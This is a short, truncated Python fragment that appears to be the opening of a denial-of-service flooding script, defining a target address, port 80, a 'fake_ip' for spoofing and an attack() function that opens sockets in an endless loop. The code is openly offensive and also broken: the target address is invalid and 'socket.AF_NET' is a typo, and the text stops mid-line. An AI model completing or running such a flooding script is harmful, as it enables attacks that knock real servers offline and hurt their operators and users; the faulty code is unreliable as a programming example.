import threading#

import socket
target = '778.00'#ip adress
port = 80
fake_ip ='182.44.00.33'
def attack():
    while True:
        s = socket.socket(socket.AF_NET, socket